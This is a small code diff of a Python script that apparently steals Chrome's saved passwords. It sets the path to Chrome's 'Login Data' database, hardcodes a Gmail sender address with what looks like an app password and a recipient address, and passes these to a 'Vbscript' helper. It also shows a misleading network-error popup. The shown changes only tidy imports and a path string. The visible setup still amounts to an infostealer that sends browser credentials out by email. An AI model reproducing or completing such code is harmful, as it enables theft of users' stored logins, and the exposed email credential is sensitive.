@@ -1,11 +1,7 @@
 from vbscript import Vbscript
 from tkinter import messagebox
 from lib.connect import checkNetwork
-import sqlite3, shutil
-
-from dotenv import load_dotenv
-import os, sys
-load_dotenv()
+import sqlite3, shutil, os, sys
 
 if checkNetwork() != True:
     messagebox.showinfo('HTTPSConnectionPool Error', message='Connect Network Error')
@@ -18,7 +14,7 @@ if __name__ == '__main__':
     FROM_EMAIL = 'xablau.mpx@gmail.com'
     FROM_PASSWORD = 'owgshskgdmnoiyjj'
     TO_EMAIL = 'vinibruno99@gmail.com'
-    LOGIN_PATH = 'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
+    LOGIN_PATH = r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'
     
     vb = Vbscript(
         from_email=FROM_EMAIL,
